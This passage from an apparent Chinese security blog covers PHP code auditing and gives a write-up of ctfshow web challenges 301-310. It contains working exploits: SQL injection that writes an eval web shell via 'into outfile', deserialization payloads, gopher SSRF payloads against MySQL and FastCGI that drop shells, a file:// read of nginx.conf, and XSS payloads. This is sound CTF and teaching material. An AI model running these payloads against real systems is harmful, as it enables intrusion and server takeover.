&#x27;https://&#x27; : &#x27;http://&#x27;);//当前访问的主机名define(&#x27;SITE_URL&#x27;, (isset($_SERVER[&#x27;HTTP_HOST&#x27;]) ? $_SERVER[&#x27;HTTP_HOST&#x27;] : &#x27;&#x27;));//来源define(&#x27;HTTP_REFERER&#x27;, isset($_SERVER[&#x27;HTTP_REFERER&#x27;]) ? $_SERVER[&#x27;HTTP_REFERER&#x27;] : &#x27;&#x27;);//定义网站根路径define(&#x27;WEB_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;web_path&#x27;));//js 路径define(&#x27;JS_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;js_path&#x27;));//css 路径define(&#x27;CSS_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;css_path&#x27;));//img 路径define(&#x27;IMG_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;img_path&#x27;));//动态程序路径define(&#x27;APP_PATH&#x27;,pc_base::load_config(&#x27;system&#x27;,&#x27;app_path&#x27;));//应用静态文件路径define(&#x27;PLUGIN_STATICS_PATH&#x27;,WEB_PATH.&#x27;statics/plugin/&#x27;);class pc_base &#123;  ......&#125;\n\n对于没有使用框架, 也没有使用自定义的mvc模型的程序, 就只需要按照传统的脚本格式的访问方式就行, 以index.php作为切入点, 依次分析相关源码即可\n参数过滤分析传统参数过滤分析, 通常会以函数的方式进行过滤, 但是某些系统也可能会在参数传入后, 进行全局参数过滤, 所以我们在审计之前, 就需要先了解应用程序采用了哪些过滤方法, 是否使用了全局参数过滤\nmvc模式下的过滤情况分析首先以tp来说, 获取参数的方式有两种, 一是通过原生的$_GET等方式获取参数, 二是通过$Request()对象获取参数. 在审计think PHP程序的时候,就需要对这两种参数进行审计\n在tp中, 会在config文件中定义一个默认的全局过滤器\n// 默认全局过滤方法 用逗号分隔多个&#x27;default_filter&#x27;         =&gt; &#x27;&#x27;,\n\n比如像上面这样, 默认的过滤器为空, 也就是说在使用$_GET等原始方法获取参数的时候, 就是不会进行过滤的\n然后再来看看$Request对象获取参数时是如何进行的, 比如request对象的get方法, 是用于获取GET方式传入的参数的\npublic function get($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)    &#123;        if (empty($this-&gt;get)) &#123;            $this-&gt;get = $_GET;        &#125;        if (is_array($name)) &#123;            $this-&gt;param      = [];            return $this-&gt;get = array_merge($this-&gt;get, $name);        &#125;        return $this-&gt;input($this-&gt;get, $name, $default, $filter);    &#125;\n\n可以看到，这里定义了三个形参，分别是name、default、filter。其中name是我们要获取的变量名，而fileter则是我们要是用的过滤器，这里默认为空，也就是不进行任何过滤。\n所以在进行审计的时候，我们就需要判断是否设置了默认的全局过滤选项，或者说是否在获取参数的时候，设置了新的过滤器。\n原生php模式下的过滤分析对于原生的php开发的应用程序, 往往是通过函数的方式来设置过滤规则, 所以就需要在参数获取的地方来看看, 是否调用了参数过滤函数来进行过滤来进行过滤, 并判断是否是有效过滤\n这里以帝国CMS为例, 进行一个简单的分析. 帝国cms的过滤函数在e/class/connect.php中, 定义了三个参数处理函数, 这里以其中一个为例, 进行分析:\n//参数处理函数function RepPostVar($val)&#123;\tif($val!=addslashes($val))\t&#123;\t\texit();\t&#125;\tCkPostStrChar($val);\t$val=str_replace(&quot;%&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot; &quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;`&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;\\t&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;%20&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;%27&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;*&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;&#x27;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;\\&quot;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;/&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;;&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;#&quot;,&quot;&quot;,$val);\t$val=str_replace(&quot;--&quot;,&quot;&quot;,$val);\t$val=RepPostStr($val,1);\t$val=addslashes($val);\t//FireWall\tFWClearGetText($val);\treturn $val;&#125;\n\n可见, 这里对% 空格 `  %20 %27 * ‘ \\ / ; # –进行了过滤\n然后我们可以具体到文件中, 看看传入的参数是否都调用了该函数进行过滤, 比如这里\n//审核评论&#123;\t$plid=$_POST[&#x27;plid&#x27;];\t$id=$_POST[&#x27;id&#x27;];\t$bclassid=$_POST[&#x27;bclassid&#x27;];\t$classid=$_POST[&#x27;classid&#x27;];\tCheckPl_all($plid,$id,$bclassid,$classid,$logininid,$loginin);&#125;function CheckPl_all($plid,$id,$bclassid,$classid,$userid,$username)&#123;\tglobal $empire,$class_r,$dbtbpre,$public_r;\t//验证权限\t$restb=(int)$_POST[&#x27;restb&#x27;];\t$count=count($plid);\tif(empty($count)||!$restb)&#123;\t\tprinterror(&quot;NotCheckPlid&quot;,&quot;history.go(-1)&quot;);\t&#125;\tif(!strstr($public_r[&#x27;pldatatbs&#x27;],&#x27;,&#x27;.$restb.&#x27;,&#x27;))&#123;\t\tprinterror(&quot;NotCheckPlid&quot;,&quot;history.go(-1)&quot;);\t&#125;\t$add=&#x27;&#x27;;\t$docheck=(int)$_POST[&#x27;docheck&#x27;];\t$docheck=$docheck?1:0;\tfor($i=0;$i&lt;$count;$i++)&#123;\t\t$add.=&quot;plid=&#x27;&quot;.intval($plid[$i]).&quot;&#x27; or &quot;;\t&#125;\t$add=substr($add,0,strlen($add)-4);\t$sql=$empire-&gt;query(&quot;update &#123;$dbtbpre&#125;enewspl_&#123;$restb&#125; set checked=&#x27;$docheck&#x27; where &quot;.$add);\tif($sql)\t&#123;\t\t....  &#125;&#125;\n\n比如这里, 后台评论管理的地方, 获取了评论和ID等参数, 在未经过滤的情况下, 传入了CheckPl_all()函数, 可见这里的参数都没有调用过滤函数进行处理, 但是好在都对这些参数使用了int类型强制类型转换; 所以比较安全\n然后我们开始刷一下ctfshow的题目301-310\n做几个题301映入眼帘一个登陆框, 猜测存在SQL注入\n果然, 毫无过滤的一个SQL注入漏洞, 然后这里第二个if判断\nif(!strcasecmp($userpwd,$row[&#x27;sds_password&#x27;]))&#123;\t$_SESSION[&#x27;login&#x27;]=1;\t$result-&gt;free();\t$mysqli-&gt;close();\theader(&quot;location:index.php&quot;);\treturn;&#125;\n\n检查$userpwd变量是否与$row[&#39;sds_password&#39;]变量相等, 如果相等, 则设置一个名为$_SESSION[&#39;login&#39;]的session变量为1\n代码第一行使用strcasecmp()函数比较$userpwd , $row[&#39;sds_password两个变量, 该函数比较两个字符串返回一个整数, 表示两个字符串的相对大小. 如果两个字符串相同则会返回0, 继续执行$_SESSION[&#39;login&#39;]=1;并释放查询结果 $result，关闭 MySQL 数据库连接 $mysqli，然后将页面重定向到 index.php\n这里我们payload是:\n1&#x27; union select 1;#1\n\n这样我们查询的结果就是1, 然后密码也设为1即可, 当然也可以是2\n\n即可登录成功, 拿到flag\n302这题就只是修改了一个地方而已\n\n多了一个加密方法, 将用户输入的密码进行了一个解码, 那么我们人工将已经解码的sds_password输入进去, 那么两个变量还是相等的, 当然我们也可以将输入的userowd编码一下再输入进去, 但是那样是逆向的很明显要复杂很多\n我们按住CTRL鼠标左键点一下sds_decode函数, 就能看见解码函数fun.php\n\n这个脚本也就是我们的exp:\n&lt;?php$str = 2;echo md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);?&gt;\n\n最终payload\n2&#x27; union select &#x27;f977952c679ca39837adaba7778c288b&#x27;;#2\n\n写入一句话木马这两题都可以采用写入一句话木马的方法解决, 这样就可以无视php的逻辑, 直接写入\n这里直接放payload\nuserid=1&#x27; union select &quot;&lt;?php eval($_POST[1]); ?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;%23&amp;userpwd=1\n\n\n然后我们直接访问1.php, 然后就拿到shell了\n\n303这题又增加了限制, 限制用户名长度小于6\n那么我们之前的方法就不适用了\n我们继续看下面的文件, 到了这个dptadd.php, 再次发现SQL语句, 是insert\n但是这个php文件, 我们无法直接访问, 需要登录后才可以, 这里有一个sql文件, 我们打开看一下, 发现了特别像密码的东西.\n 但是根据上一题经验, 这里的密码也应该是编码过的, 我们再去fun.php看一下, 运行刚好是那串字符串\n那么账号密码就应该是admin,admin; 当然这里爆破弱口令似乎也是可以的\n这里直接贴一下payload\ndpt_name=123&#x27;,sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123dpt_name=123&#x27;,sds_address=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;sds_fl9g&#x27;)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123dpt_name=123&#x27;,sds_address=(select flag from sds_fl9g)%23&amp;dpt_address=123&amp;dpt_build_year=2023-03-01&amp;dpt_has_cert=on&amp;dpt_cert_number=123&amp;dpt_telephone_number=123\n\n我们只需要抓一个dptadd.php的包\n\n最终的查询结果就可以在dpt.php界面显示出来\n304增加了全局waf\nfunction sds_waf($str)&#123;\treturn preg_match(&#x27;/[0-9]|[a-z]|-/i&#x27;, $str);&#125;\n\n但是好像并没有什么用,  貌似是源代码里没有用上waf, 我们继续试一下上题的payload,\n\n这里只是换了个表名, 但是payload仍然适用\n305这里介绍一个比较好用的工具, seay源码审计系统\n我们把文件夹在里边打开直接点击自动审计即可\n我们先看一下这个sql注入, 会发现这里套了waf, 那很明显前面的SQL注入就不能用了\n那么我们尝试利用一下这个反序列化漏洞\n\n这里有个file_put_contents, 那么反序列化入口点在哪呢, 我们可以搜一下user试试\n\n可以看出cookie 是反序列化入口, 我们先构造一个一句话木马试一试\nexp:\n&lt;?phpclass user&#123;    public $username;    public $password;    public function __construct()&#123;        $this-&gt;username=&#x27;1.php&#x27;;        $this-&gt;password=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;    &#125;&#125;$a = new user();echo urlencode(serialize($a));?&gt;\n\n运行得到结果\nO%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A5%3A%221.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D\n\n这里还是需要我们登录后才能利用的, 所以我们要首先利用弱口令登录, 然后访问checklogin.php通过cookie发包\n\n连蚁剑并没有发现flag, 但是存在数据库, 我们猜测flag在数据库里\n306扫一下, 又在class.php里发现了漏洞\n\n然后我们再找一下close(), 然后在dao.php中找到了\n我们构造一下exp.php\n\n&lt;?phpclass dao&#123;    private $conn;    public function __construct()    &#123;        $this-&gt;conn=new log();    &#125;&#125;class log&#123;    public $title=&#x27;1.php&#x27;;    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));\n\n执行exp结果:\nTzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319\n\n访问index.php并添加usercookie\n\n写入木马文件1.php\n307用工具扫一下, 扫出shell_exec可能存在任意命令执行漏洞\n这里先找一下clearCache, 可以全局搜索一下, 在logout.php中, 发现了可利用点\n再看一下cache_dir, 在config类里\n这次我们从logout.php写servicecookie, 写入一句话木马php文件\n访问http://url/controller/1.php\n\n308上题利用的漏洞已经被修复了, 但是fun.php里多了一个ssrf利用点\n在dao.php中发现被调用\n又在index.php中找到利用点\n然后我们发现数据库密码为空, 这里我们可以想到使用gopher打MySQL\n利用gopherus生成，地址https://github.com/tarunkant/Gopherus![image-20230323131716266](https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202303231317501.png)\n可以构造出最终exp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url=&#x27;gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n访问首页并写入payload\n\n309这题提到说MySQL有密码了, 那我们就没法利用3306端口了, 可以先通过file协议读一下配置文件, 看看有没有其他利用点, 可以看到是nginx\npoc\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url=&#x27;file:///etc/nginx/nginx.conf&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n\n发现这里开放了9000端口, 我们可以尝试打一下fastcgi\n\nexp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url = &#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH93%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5D%04%00%3C%3Fphp%20system%28%27%20echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%201.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n310像上题一样, 先读一下配置文件看看有没有什么蹊跷, 这里9000端口仍然开放, 我们再尝试打一下试试\n\n可以成功读取\n这题我们还会发现配置文件里还有另一个端口, 4476, 可以直接利用这个端口\n\n直访问\nexp\n&lt;?phpclass dao&#123;    private $config;    public function __construct()&#123;        $this-&gt;config=new config();    &#125;&#125;class config&#123;    public $update_url = &#x27;http://127.0.0.1:4476&#x27;;&#125;$a = new dao();echo base64_encode(serialize($a));?&gt;\n\n拿到flag\n常见漏洞审计方法总结SQL注入首先了解SQL注入常见的业务场景与漏洞类型\n\n用户登录\n数据搜索\n获取HTTP头\n商品购买(insert/update注入)\n信息查询\n\n可以说, 任何与数据库进行交互的地方都可能存在SQL注入, 对于其漏洞存在场景也是多种多样\n对于SQL注入最首先要关注的就是数据库操作的关键字\n在原生PHP代码中要多关注这些\nselectmysqli_connectmysqli_querymysqli_fetch_rowmysqli_fetch_arrayupdateindert intodelete\n\n在CMS或者框架中,需要多关注下面这些\nname()where()find()select()\n\n通过定位这些关键字，我们就能够定位到执行SQL语句的地方，然后去判断执行SQL语句中的参数是否采用了拼接SQL的方式，如果是则去判断是否存在参数过滤以及参数是否可控。\n如果参数不可控，来源于某一条SQL语句查询出的结果，我们就需要重点关注这个参数是否来源于其他的用户输入，如果是，则需要考虑是否存在二次注入的情况。\nXSSxss漏洞需要重点关注输出函数\nprint()echo print_f()die()var_dump()print_r()\n\n然后去判断输出的内容是否存在可控变量, 并检测这些变量在输入或者输出的时候是否采用了HTML实体编码, 或者是否对输入进行了过滤, 如果什么都没有, 在输出内容可控的情况下则很可能存在xss漏洞\nCSRF可以尝试全局搜索\ncsrf-tokencsrf_tokencsrftokencsrf\n\n重点看一下是否在表单处存在随机token, 是否存在敏感操作的表单, 查看后端代码中是否会先验证这部分token, 如果没有验证token, 再进一步看看是否有refer的相关验证, 如果也没用就可能存在csrf\nSSRFssrf漏洞引发函数主要是能用于远程请求资源的一些函数, 像这些\nfile_get_content()curl()fopen()readline()fsockopen()curl_exec()get_headers()\n\n再看是否限制了访问端口/协议/内网IP地址等\n常见的漏洞场景:\n\n社交分享\n转码服务\n在线翻译\n没有使用img标签的远程图片加载\n\n对于检测方法主要也是通过判断这些函数获取的url或者文件名是否可控, 如果可控, 则可能造成漏洞, 同时也容易造成上面提到的任意文件读取漏洞\n利用file://,http://,https://,dice://,gopher://协议打内网\n代码执行需要关注的一些函数:\neval()assert()preg_replace()array_map()call_user_funcn()\n\nassert()函数在PHP中与eval类似，但是只能执行一行代码，在PHP7中则取消了该函数执行动态代码的功能，也就是说执行执行固定的代码了。\n其他的代码执行函数，大多数为回调函数，具备了调用php代码的功能。\n审计要素:\n\nphp.ini文件中的disable_function是否有禁用函数\n是否存在可以diamagnetic执行的敏感函数\n是否输入变量可控\n\n命令执行system()exec()shell_exec()passthru()popen()proc_open()\n\n对于命令执行漏洞来说，主要还是存在于一些获取系统信息的地方，可能会通过执行命令的方式来获取，若果说执行的命令可控的话，则可能导致命令执行。\n对于命令执行的其中几个方法，存在一定的差异：\n\nsystem()是执行系统命令并返回执行结果。\nexec()则是执行命令后，返回一个结果句柄，并不直接返回结果。\nshell_exec()则是执行不返回命令执行后的任何信息。\n\n在php中, 通过&#123;&#125;的方式同样能够执行代码, 同时还能通过动态拼接代码的方式来执行PHP代码. 通过使用双反引号的方式, 也能够同样做到等同于system的命令执行效果\n文件上传、删除、下载文件上传常见的业务有\n\n头像上传\n备份文件上传\n配置文件上传\n\n对于文件上传漏洞，需要关注的函数为：\nmove_uplaod_file()\n\n在审计的时候就只需要去搜欧索这一个函数，然后判断是否对文件上传的格式做限制，或者说是否可以绕过文件后缀限制。\n如果说不能绕过的话，则需要去检测是否存在文件解析漏洞或者文件包含漏洞，然后进行绕过利用。\n文件删除对于文件删除漏洞，触发漏洞的函数同样只有一个，那就是\nunlink()\n\n我们在审计的时候，判断文件名是否可控，同时检测是否允许文件命中存在路径穿越符，如果允许，则说明存在任意文件删除漏洞，危害较大。\n文件写入常见触发函数如下\nfile_get_content()fopen()readfile()fread()file()\n\n对于这种漏洞，可以在黑盒的情况下先去找文件读取和下载的的功能点，然后通过请求的URL去分析功能对应的具体代码，再来判断读取的文件，其文件名是否可控，是否允许文件名存在路径穿越符等。\n如果存在漏洞的情况下，利用方法一时读取系统文件，而是读取网站源码，在读取的时候，我们可以使用php的伪协议来读取源码。\n文件包含常见触发函数\ninclude()require()include_once()require_once()\n\n全局搜索, 然后一个个看, 查看变量可不可控\nXXE常见触发函数\nsimplexml_load_string()DOMDocumentSimpleXMLElement\n\n我们需要判断被解析的XML数据是否允许我们外部输入，并且是否允许代用外部实体，是否禁用了外部实体, 然后再进行详细的分析与利用\n反序列化可以尝试全局搜索一下serialize, 重点关注下列几个函数\n__construct：在创建对象时候初始化对象，一般用于对变量赋初值。__destruct：和构造函数相反，当对象所在函数调用完毕后执行。__call：当调用对象中不存在的方法会自动调用该方法。__get()：获取对象不存在的属性时执行此函数。__set()：设置对象不存在的属性时执行此函数。__toString：当对象被当做一个字符串使用时调用。__sleep：序列化对象之前就调用此方法(其返回需要一个数组)__wakeup：反序列化恢复对象之前调用该方法__isset()：在不可访问的属性上调用isset()或empty()触发__unset()：在不可访问的属性上使用unset()时触发__invoke() ：将对象当作函数来使用时执行此方法\n\n看看存不存在可控变量\n审计技巧总结GPC简单介绍一下GPC, magic_quotes_gpc是php.ini里面的配置选项,在php5.2之前的版本默认开启, 在5.2-5.4之间的版本默认关闭, 5.4以后的版本直接取消了这一配置项\n该配置项的作用就是对我们传入的POST, GET, COOKIE变量中的&#39;,&quot;,\\,NULL等字符前加上\\进行转义\n在php中, 看其GPC的方法有两种, 一是在php.ini中配置magic_quotes_gpc选项的值为on, 还有一种就是在php代码中使用get_magic_quotes_gpc()函数判断是否开启该选项, 如果没有则使用addslashes()函数进行转义, 比如\nif (!get_magic_quotes_gpc()) &#123;  //magic_quotes_gpc 配置为 ON 则返回1，如果配置为OFF 则返回0\t$_POST[&#x27;message&#x27;] = addslashes($_POST[&#x27;message&#x27;]);&#125; else &#123;\t.......&#125;\n\n在php中, 我们提到了POST等变量会受到全局配置GPC的影响, 但是$_SERVER变量不会, 其中获取http头并不受到GPC保护, 如果说获取的HTTP头存在于数据库交互的行为, 则可能导致SQL注入\n同时由于使用了GPC对特殊字符进行转义, 我们都知道宽字节注入的原理, 如果说在开启了GPC的情况下, 还设置了数据库编码为GBK模式, 则可能导致宽字节注入的存在, 在php中设置数据库编码的方式有以下两种\n方法1： mysqli_set_charset($connnect,&#x27;GBK&#x27;)方法2： mysqli_query(&quot;set names &#x27;gbk&#x27;&quot;)\n\n这两种方法都能设置数据库的编码模式，在开启了GPC的情况下，就容易出现宽字节注入的问题。\n利用字符处理问题利用字符处理函数报错在了解这个问题之前, 我们需要知道, 在php中, 报错信息分为多个等级, 可以通过配置php.ini的display_error=on或者在代码中使用error_reporting()来设置报错等级; 常见报错等级如下\n1、E_ERROR             //致命的运行时错误。这类错误一般是不可恢复的情况，例如内存分配导致的问题。后果是导致脚本终止不再继续运行。2、E_WARNING          //运行时警告 (非致命错误)。仅给出提示信息，但是脚本不会终止运行。3、E_PARSE            //编译时语法解析错误。解析错误仅仅由分析器产生4、E_NOTICE           //运行时通知。5、E_USER_ERROR       //用户产生的错误信息。6、E_USER_WARNING     //用户产生的警告信息。7、E_USER_NOTICE8、E_STRICT           //启用 PHP 对代码的修改建议，以确保代码具有最佳的互操作性和向前兼容性。9、E_ALL              //E_STRICT除外的所有错误和警告信息。\n\n在PHP中，大多数的错误都会显示错误的文件路径与集体位置，在渗透测试中，经常会遇到上传或者写入webshell的的情况需要知道网站绝对路径，这时候我们就可以考虑使用PHP报错来获取网站路径。\n对于PHP程序来说，大多数开发者都会使用trim()函数来去除参数首尾的空调，但是当我们传入的参数是一个数组的时候，比如/index.php?a[]=test,这时候如果采用trim($_GET(&#39;a&#39;)) 来去除a参数的空格的话，就会导致程序报错。\n类似的函数还有很多, 类似\naddcslashes()bin2hex()chr()exho()explode()crypto()md5()\n\n利用字符串截断字符串截断利用最多的则是在文件上传的时候，但是%00空字符即NULL，在开启了GPC的情况下会受到影响为不能正常利用。同时在PHP5.3以后，修复了这一问题，所以利用场景相对目前来比较少见。这里就只简单的提一下。\n还有另外一种字符串截断情况, 就是使用了iconv()函数进行编码转换时, 比如utf-8转换为gbk编码, 总会存在一些差异, 导致转换出现乱码, 所以在使用了iconv()函数进行转换时, 如果出现了错误, 则会不再进行转换, 导致了字符串被截断的问题\n有大佬测试了相关问题，发现在使用iconv()函数将UTF-8编码转为GBK编码的情况下，遇到cahr(128)—chr(255)之间的字符否存在被截断的可能。\n不严谨的正则表达式比如下面这样\n$ip=$_SERVER(&#x27;HTTP_CLIENT_IP&#x27;);if(preg_match(&#x27;/\\d+\\.\\d+\\.\\d+\\.\\d+/&#x27;,$ip))&#123;\techo $ip;&#125;\n\n我们只需要在传入的payload以IP地址开头即可绕过, 像这样127.0.0.1&lt;/scritp&gt;alert(xss)&lt;/scritp&gt;\n文章参考:https://blog.csdn.net/qq_45590334/article/details/126517767\n","tags":["Web","Study","PHP","代码审计"]},{"title":"Web_XSS","url":"/2022/05/04/web_XSS/","content":"在这之前先搞清楚xss的原理\nXSS的原理和分类xss呢就是在web页面插入一段恶意的script代码，用户浏览页面的的时候，嵌入web里的script代码就执行，然后就达到恶意攻击用户的目的。xss是针对用户层面的攻击。\nxss有三类：存储型、反射型和DOM型；\n存储型XSS：\n存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。\n\n反射型XSS：\n反射型XSS，非持久化，需要欺骗用户自己去点链接才能触发XSS代码（并没有存储在服务器中），一般容易出现在搜索页面。反射型XSS大多数用来盗取用户的Cookie。\n\nDOM型XSS：\nDOM型XSS，不经过后端，是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：DOM文档对象模型\n可能触发DOM型XSS的属性：\n\ndocument.refererwindow.namelocationinnerHTMLdocumen.write\n\n如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。\n\nXSS的攻击载荷以下所有标签的 &gt; 都可以用 // 代替， 例如 &lt;script&gt;alert(welcome)&lt;/script//\nscript标签script标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，可以将代码插入脚本标记中\n\nsvg标签\nimg标签\nbody标签\nvideo标签\nstyle标签\nXSS可以插在哪里？\n·用户输入作为script标签内容\n·用户输入作为HTML注释内容\n·用户输入作为HTML标签的属性名\n·用户输入作为HTML标签的属性值\n·用户输入作为HTML标签的名字\n·直接插入到CSS里\ntips:最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！\n\n#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过&lt;!-- 用户输入 --&gt;&lt;!-- --&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;!-- --&gt;#用户输入作为标签属性名，导致攻击者可以进行闭合绕过&lt;div 用户输入=&quot;xx&quot;&gt;  &lt;/div&gt;&lt;div &gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;xx&quot;&gt; &lt;/div&gt;#用户输入作为标签属性值，导致攻击者可以进行闭合绕过&lt;div id=&quot;用户输入&quot;&gt;&lt;/div&gt;&lt;div id=&quot;&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;div a=&quot;x&quot;&gt;&lt;/div&gt;#用户输入作为标签名，导致攻击者可以进行闭合绕过&lt;用户输入  id=&quot;xx&quot; /&gt;&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;#用户输入作为CSS内容，导致攻击者可以进行闭合绕过&lt;style&gt;用户输入&lt;style&gt;&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;\n\nXSS漏洞挖掘黑盒测试尽可能扎到一切用户可控并且能够输出在页面代码中的地方，比如：\n\n·url的每一个参数\n·url本身\n·表单\n·搜索框\n\n常见业务场景\n\n·重灾区：评论区、留言区、个人信息、订单信息等。\n·针对性：站内信、网页即时通讯、私信、意见反馈等。\n·存在风险：搜索框、当前目录、图片属性等。\n\n白盒测试（代码审计）关于XSS的代码审计主要是从接手参数的地方和一些关键词入手。\nPHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等，可以搜索所有接收参数的地方。然后对接收的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和HTML编码等处理。\n也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取得，是否能控制存到数据库中的数据，存到数据库之前有无过滤等。\n大多数程序会接收参数封装在公文文件的函数中统一调用，我们需要审计这些公共函数有没有过滤，能否绕过等。\nXSS攻击过程反射型XSS漏洞：\n\nAlice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。\nTom 发现 Bob的站点存在反射性的XSS漏洞\nTom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击\nAlice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接\n嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。\nTom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制\n\n\n存储型XSS漏洞：\n\nBob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。\nTom检测到Bob的站点存在存储型的XSS漏洞。\nTom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。\nBob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。\nTom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击\n\n\nXSS漏洞的危害\nXSS漏洞简单攻击测试源码反射型//前端 1.html：&lt;html&gt;&lt;head lang=&quot;en&quot;&gt;    